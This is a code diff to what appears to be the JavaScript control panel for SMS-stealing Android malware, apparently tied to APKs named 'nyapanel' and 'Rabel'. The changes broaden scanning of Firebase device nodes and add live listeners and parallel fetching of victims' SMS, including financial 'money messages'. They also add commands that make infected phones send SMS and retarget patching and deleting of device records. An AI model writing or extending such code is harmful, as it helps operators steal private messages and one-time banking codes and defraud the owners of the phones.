@@ -38,6 +38,8 @@ var DEVICE_FETCH_NODES=[
 ];
 var SUMMARY_NODES=DEVICE_FETCH_NODES.slice();
 var DEVICE_NODES=['devices','users','clients_list','online_devices','Verify_Device','user_list','user_data','clients'];
+/** Nodes that get realtime child_added/changed listeners (multi-node device sync) */
+var DEVICE_LIVE_CHILD_NODES=['clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','AllClients','all_clients','online_devices','online_users','clients_list','client_list','device_list','devices_list','registered_users','active_devices'];
 /** Per-device SMS subpaths used by Rabel / SpinPlay / Shootii panels */
 var PANEL_SMS_SUFFIXES=['all_sms','new_sms','sms','messages','sms_inbox','inbox','received_sms','sent_sms','sms_list','user_sms','msg_list'];
 /** Global SMS roots keyed by device id — rebel.py uses messages/{id} */
@@ -151,23 +153,28 @@ function isJunkSmsPath(path){
 function getApkSmsPath(d){
   return d&&d.rawId?'messages/'+d.rawId:'';
 }
-/** nyapanel.apk reads SMS only from messages/{deviceId} — rebel.py same */
+/** nyapanel.apk primary SMS path — still merge other nodes in background */
 function shouldUseApkSmsPath(inst,d){
-  if(!inst)return true;
-  if(inst.config&&String(inst.config.id||'').indexOf('nya_')===0)return true;
-  if(inst.config&&inst.config.deviceNode==='clients')return true;
-  if(inst.config&&inst.config.preferredDeviceNode==='clients')return true;
-  if(inst.schema==='rabel'&&inst.rootKeys&&inst.rootKeys.indexOf('clients')>=0&&inst.rootKeys.indexOf('messages')>=0)return true;
-  if(d&&d.deviceNode==='clients')return true;
+  if(!inst)return false;
+  if(inst.config&&String(inst.config.id||'')==='nya_hdjdjdj')return true;
+  if(inst.config&&String(inst.config.name||'').indexOf('Nya Panel')>=0)return true;
   return false;
+}
+function getDeviceProfilePath(d,fallback){
+  if(!d)return fallback||'clients';
+  return d.deviceNode||fallback||'clients';
+}
+function isDeviceLiveChildNode(node){
+  if(!node)return false;
+  if(DEVICE_LIVE_CHILD_NODES.indexOf(node)>=0)return true;
+  return isDeviceSummaryNode(node)&&SKIP_NODES.indexOf(node)<0;
 }
 function getPrioritySmsPaths(d,inst){
   var id=d&&d.rawId, paths=[];
   if(!id)return paths;
-  if(shouldUseApkSmsPath(inst,d))return [getApkSmsPath(d)];
+  if(shouldUseApkSmsPath(inst,d))paths.push(getApkSmsPath(d));
   if(inst&&inst.smsIndex&&inst.smsIndex[id]&&inst.smsIndex[id].roots&&inst.smsIndex[id].roots.length){
     inst.smsIndex[id].roots.forEach(function(root){if(root)paths.push(root+'/'+id);});
-    return uniqPaths(paths);
   }
   if(inst&&inst.smsRootKeys&&inst.smsRootKeys.length){
     inst.smsRootKeys.forEach(function(root){
@@ -175,6 +182,13 @@ function getPrioritySmsPaths(d,inst){
     });
   }
   paths.unshift('messages/'+id);
+  getSmsDeviceBases(d,inst).forEach(function(n){
+    if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
+    ['all_sms','new_sms','sms','messages','user_sms'].forEach(function(sfx){
+      var p=n+'/'+id+'/'+sfx;
+      if(paths.indexOf(p)<0)paths.push(p);
+    });
+  });
   if(isRabelPanel(inst)||paths.length){
     ['user_sms','sms_backup','all_sms','new_sms'].forEach(function(root){
       var p=root+'/'+id;
@@ -199,12 +213,7 @@ function restJsonInstShallowNode(inst,node){
 }
 function buildSmsIndex(inst){
   if(!inst||inst.smsIndexReady)return Promise.resolve();
-  if(inst.rootKeys&&inst.rootKeys.indexOf('messages')>=0&&inst.rootKeys.indexOf('clients')>=0){
-    inst.smsIndex=inst.smsIndex||{};
-    inst.smsIndexReady=true;
-    return Promise.resolve();
-  }
-  var scanRoots=['user_sms','sms_backup'];
+  var scanRoots=['user_sms','sms_backup','messages','all_sms','new_sms','sms','sms_inbox','inbox'];
   if(inst.smsRootKeys&&inst.smsRootKeys.length){
     scanRoots=uniqPaths(inst.smsRootKeys.filter(isInboundSmsRootNode).concat(scanRoots));
   }else if(isRabelPanel(inst)){
@@ -498,7 +507,7 @@ function parseJoinedToMs(joined){
 function patchClientField(d,fields,okMsg){
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase not loaded',false);return Promise.resolve(false);}
-  var node='clients/'+d.rawId;
+  var node=getDeviceProfilePath(d)+'/'+d.rawId;
   var url=buildRestUrl(inst,node,getFbAuthKey(inst));
   return fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(fields)})
     .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
@@ -639,7 +648,7 @@ function deleteDeviceCard(id,ev){
   if(!confirm('Delete this device from Firebase?'))return;
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase not loaded',false);return;}
-  var url=buildRestUrl(inst,'clients/'+d.rawId,getFbAuthKey(inst));
+  var url=buildRestUrl(inst,getDeviceProfilePath(d)+'/'+d.rawId,getFbAuthKey(inst));
   fetch(url,{method:'DELETE'}).then(function(r){
     if(r.ok){
       delete clientsRawMap[d.id];
@@ -1271,7 +1280,7 @@ function ingestDeviceData(fbId,node,devId,data){
   if((!norm.mobNo||!String(norm.mobNo).trim())&&data.phone_number&&!isNyaApkClientRecord(data))norm.mobNo=parseDevicePhone(data.phone_number)||String(data.phone_number).trim();
   norm._node=node;norm._fbId=fbId;
   var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
-  var profileNode=(node==='clients'||node==='devices'||node==='Verify_Device'||node==='user_list');
+  var profileNode=(node==='clients'||node==='devices'||node==='Verify_Device'||node==='user_list'||node==='user_data'||node==='devices_status');
   if(profileNode&&existing._node&&existing._node==='user_data'&&!existing.mobNo){
     /* clients profile replaces empty user_data stub */
   }else if(!profileNode&&existing.mobNo&&existing._node==='clients'){
@@ -1446,12 +1455,23 @@ function countInstDevices(fbId){
 function primaryDeviceNodesForInst(inst,roots){
   roots=roots||{};
   var nodes=[];
+  if(roots&&typeof roots==='object'){
+    Object.keys(roots).forEach(function(n){
+      if(isDeviceSummaryNode(n)&&nodes.indexOf(n)<0)nodes.push(n);
+    });
+  }
   ['clients','devices','Verify_Device','user_list','user_data'].forEach(function(n){
     if(roots[n]&&nodes.indexOf(n)<0)nodes.push(n);
   });
-  if(!nodes.length)nodes=getDeviceNodesForInst(inst).slice(0,10);
+  if(!nodes.length)nodes=getDeviceNodesForInst(inst).slice(0,16);
+  getDeviceNodesForInst(inst).forEach(function(n){
+    if(n&&nodes.indexOf(n)<0)nodes.push(n);
+  });
   if(roots.clients&&nodes.indexOf('clients')<0)nodes.unshift('clients');
   return nodes.filter(function(n,i,a){return n&&a.indexOf(n)===i;});
+}
+function allDeviceNodesForInst(inst,roots){
+  return primaryDeviceNodesForInst(inst,roots||{});
 }
 function processClientsData(){
   if(_procDevsTimer)clearTimeout(_procDevsTimer);
@@ -1517,31 +1537,32 @@ function discoverInstance(inst){
       inst.schema=detectSchemaFromRoots(roots,inst);
       if(inst.config){
         inst.config.schema=inst.schema;
-        if(roots.clients)inst.config.preferredDeviceNode='clients';
-        else if(roots.user_list)inst.config.preferredDeviceNode='user_list';
-        else if(roots.user_data)inst.config.preferredDeviceNode='user_data';
+        if(roots.Verify_Device&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='Verify_Device';
+        else if(roots.user_list&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='user_list';
+        else if(roots.user_data&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='user_data';
+        else if(roots.clients&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='clients';
       }
-      var before=countInstDevices(inst.id);
-      var nodes=primaryDeviceNodesForInst(inst,roots);
-      return Promise.all(nodes.map(function(n){
-        return fetchSummaryNode(inst,n).catch(function(){return null;});
-      })).then(function(){
-        if(countInstDevices(inst.id)<=before)return bruteFetchDeviceNodes(inst);
-        return null;
-      }).then(function(){
-        return enrichFromUserList(inst);
-      }).then(function(){
-        return buildSmsIndex(inst);
-      });
-    }
-    return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);}).then(function(){return buildSmsIndex(inst);});
+    }else roots={};
+    var nodes=allDeviceNodesForInst(inst,roots);
+    return Promise.all(nodes.map(function(n){
+      return fetchSummaryNode(inst,n).catch(function(){return null;});
+    })).then(function(){
+      return enrichFromUserList(inst);
+    }).then(function(){
+      return buildSmsIndex(inst);
+    });
   }).catch(function(){
-    return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);}).then(function(){return buildSmsIndex(inst);});
+    return bruteFetchDeviceNodes(inst).then(function(){
+      return enrichFromUserList(inst);
+    }).then(function(){
+      return buildSmsIndex(inst);
+    });
   });
 }
 function attachLive(inst){
   if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
-  getDeviceNodesForInst(inst).slice(0,12).forEach(function(node){
+  var watched=getDeviceNodesForInst(inst).slice(0,20);
+  watched.forEach(function(node){
     try{
       var ref=inst.db.ref(node);
       ref.on('value',function(s){
@@ -1549,7 +1570,7 @@ function attachLive(inst){
         mergeSummaryNode(inst.id,node,s.val());
         processClientsData();
       });
-      if(node==='clients'||node==='devices'||node==='user_list'){
+      if(isDeviceLiveChildNode(node)){
         var onChild=function(snap){
           var data=snap.val();
           if(!data||typeof data!=='object')return;
@@ -1565,6 +1586,16 @@ function attachLive(inst){
         ref.on('child_changed',onChildInstant);
         ref.on('child_added',onChild);
       }
+    }catch(e){}
+  });
+  var smsRoots=(inst.smsRootKeys||PANEL_SMS_GLOBAL_NODES).slice(0,8);
+  smsRoots.forEach(function(root){
+    if(!root||SKIP_NODES.indexOf(root)>=0)return;
+    try{
+      inst.db.ref(root).on('child_changed',function(snap){
+        if(!snap||!snap.key)return;
+        mergeSmsIntoDevice(makeDevKey(inst.id,snap.key),parseSmsRaw(snap.val()));
+      });
     }catch(e){}
   });
 }
@@ -1740,20 +1771,27 @@ function loadMoneyMessages(force){
     }).catch(function(){return[];});
   }
   function loadInst(inst){
-    return restJsonInst(inst,'clients').then(function(clients){
-      if(!clients||typeof clients!=='object')return [];
-      var keys=Object.keys(clients);
-      return keys.reduce(function(chain,clientKey){
-        return chain.then(function(acc){
-          var clientData=clients[clientKey];
-          if(!clientData||typeof clientData!=='object')return acc;
-          if(!hasApkModelName(clientData))return acc;
-          return fetchClientMessages(inst,clientKey,clientData).then(function(rows){
-            return acc.concat(rows);
+    var devs=allDevs.filter(function(d){return d.fbId===inst.id;});
+    if(!devs.length){
+      return restJsonInst(inst,'clients').then(function(clients){
+        if(!clients||typeof clients!=='object')return [];
+        return Object.keys(clients).reduce(function(chain,clientKey){
+          return chain.then(function(acc){
+            var clientData=clients[clientKey];
+            if(!clientData||typeof clientData!=='object')return acc;
+            if(!hasApkModelName(clientData))return acc;
+            return fetchClientMessages(inst,clientKey,clientData).then(function(rows){return acc.concat(rows);});
           });
-        });
-      },Promise.resolve([]));
-    }).catch(function(){return[];});
+        },Promise.resolve([]));
+      }).catch(function(){return[];});
+    }
+    return devs.reduce(function(chain,d){
+      return chain.then(function(acc){
+        var raw=getRawDev(d.id);
+        if(!hasApkModelName(raw)&&!raw.modelName&&!raw.mobNo&&!raw.deviceId)return acc;
+        return fetchClientMessages(inst,d.rawId,raw).then(function(rows){return acc.concat(rows);});
+      });
+    },Promise.resolve([]));
   }
   return Promise.all(insts.map(loadInst)).then(function(results){
     var out=[];
@@ -1996,7 +2034,7 @@ function attachSelectedDeviceLive(d){
       if(activeListeners[liveKey].ref&&activeListeners[liveKey].h)activeListeners[liveKey].ref.off('value',activeListeners[liveKey].h);
     }catch(e){}
   }
-  var node=(d.deviceNode||'clients')+'/'+d.rawId;
+  var node=getDeviceProfilePath(d)+'/'+d.rawId;
   try{
     var ref=inst.db.ref(node);
     var h=function(snap){
@@ -2004,7 +2042,7 @@ function attachSelectedDeviceLive(d){
       if(selDev!==d.id)return;
       var val=typeof snap.val==='function'?snap.val():snap;
       if(!val||typeof val!=='object')return;
-      ingestDeviceData(d.fbId,d.deviceNode||'clients',d.rawId,val);
+      ingestDeviceData(d.fbId,getDeviceProfilePath(d),d.rawId,val);
       processClientsDataNow();
       renderDeviceDetail();
     };
@@ -2235,13 +2273,7 @@ function attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn){
 }
 function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
   if(!inst||!inst.db||typeof applyFn!=='function')return;
-  if(shouldUseApkSmsPath(inst,d)){
-    attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn);
-    return;
-  }
-  var paths=getPrioritySmsPaths(d,inst);
-  if(!paths.length)paths=['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId];
-  paths=uniqPaths(['messages/'+d.rawId].concat(paths)).slice(0,3);
+  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId])).slice(0,6);
   paths.forEach(function(path){
     if(!path)return;
     try{
@@ -2382,18 +2414,15 @@ function fetchSmsPathsParallel(inst,paths){
 }
 function fetchSmsFast(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var apkPath=getApkSmsPath(d);
-  if(shouldUseApkSmsPath(inst,d)){
-    return restJsonInst(inst,apkPath).then(function(data){
-      return parseSmsRaw(data);
+  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(buildUniversalSmsPaths(d,inst).slice(0,6))).slice(0,12);
+  if(!paths.length)paths=['messages/'+d.rawId];
+  var wave1=paths.slice(0,shouldUseApkSmsPath(inst,d)?2:4);
+  var wave2=paths.slice(wave1.length);
+  return fetchSmsPathsParallel(inst,wave1).then(function(first){
+    if(!wave2.length)return first;
+    return fetchSmsPathsParallel(inst,wave2).then(function(rest){
+      return mergeSmsLists(first,rest);
     });
-  }
-  return restJsonInst(inst,apkPath).then(function(data){
-    var list=parseSmsRaw(data);
-    if(list.length)return list;
-    var paths=getPrioritySmsPaths(d,inst).filter(function(p){return p!==apkPath;}).slice(0,4);
-    if(!paths.length)return [];
-    return fetchSmsPathsParallel(inst,paths);
   });
 }
 
@@ -2401,7 +2430,7 @@ function fetchSmsFromPathsDirect(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var priority=getPrioritySmsPaths(d,inst);
   var extra=buildUniversalSmsPaths(d,inst).filter(function(p){return priority.indexOf(p)<0&&!isJunkSmsPath(p);});
-  var fetchList=uniqPaths(priority.concat(extra)).slice(0,12);
+  var fetchList=uniqPaths(priority.concat(extra)).slice(0,16);
   return fetchSmsPathsParallel(inst,fetchList);
 }
 function fetchSmsViaPhp(inst,d){
@@ -2479,7 +2508,7 @@ function loadSmsForDevice(force){
     _smsLoading=false;
     if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
     else renderSms();
-  },apkSms?3500:12000);
+  },apkSms?5000:12000);
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
@@ -2489,20 +2518,25 @@ function loadSmsForDevice(force){
   }
 
   fetchSmsFast(inst,d).then(applySmsList);
+  fetchSmsFromPathsDirect(inst,d).then(function(full){
+    if(seq!==_smsLoadSeq||selDev!==devId||!full||!full.length)return;
+    applySmsList(full);
+  });
+  fetchSmsViaPhp(inst,d).then(function(fb){
+    if(seq!==_smsLoadSeq||selDev!==devId||!fb||!fb.length)return;
+    applySmsList(fb);
+  });
 
   var listeners={refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db,timers:[]};
   attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
 
-  if(!apkSms){
-    var pollMs=inst.db?SMS_POLL_MS:SMS_POLL_BG_MS;
-    var timer=setInterval(function(){
-      if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
-      fetchSmsFast(inst,d).then(applySmsList);
-      if(!inst.db)fetchSmsFromPathsDirect(inst,d).then(applySmsList);
-    },pollMs);
-    listeners.timer=timer;
-    listeners.timers=[timer];
-  }
+  var pollMs=inst.db?SMS_POLL_MS:SMS_POLL_BG_MS;
+  var timer=setInterval(function(){
+    if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
+    fetchSmsFromPathsDirect(inst,d).then(applySmsList);
+  },pollMs);
+  listeners.timer=timer;
+  listeners.timers=[timer];
 
   activeListeners[devId]=listeners;
 }
@@ -2694,17 +2728,22 @@ function buildRto9SendPayload(deviceId,sim,to,message){
 }
 function getSendAttempts(inst,d,to,message,sim){
   var id=d.rawId,out=[],rabel=buildRabelSendPayload(sim,to,message);
+  var profileNode=getDeviceProfilePath(d);
+  out.push({path:profileNode+'/'+id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
   out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
   var nya=isNyaApkFirebase(inst)||shouldUseApkSmsPath(inst,d)||isNyaApkClientRecord(getRawDev(d.id));
   if(nya){
     out.push({path:'clients/'+id,payload:buildNyaApkCommandPatch(id,sim,to,message),method:'PATCH'});
+    if(profileNode!=='clients')out.push({path:profileNode+'/'+id,payload:buildNyaApkCommandPatch(id,sim,to,message),method:'PATCH'});
     return out;
   }
   if(isRtoStyleUrl(inst.restUrl)||isRabelPanel(inst)){
     var patch=buildNyaApkCommandPatch(id,sim,to,message);
+    out.push({path:profileNode+'/'+id,payload:patch,method:'PATCH'});
     out.push({path:'clients/'+id,payload:patch,method:'PATCH'});
     out.push({path:id,payload:patch,method:'PATCH'});
     out.push({path:id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
+    out.push({path:profileNode+'/'+id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
   }
   return out;
 }
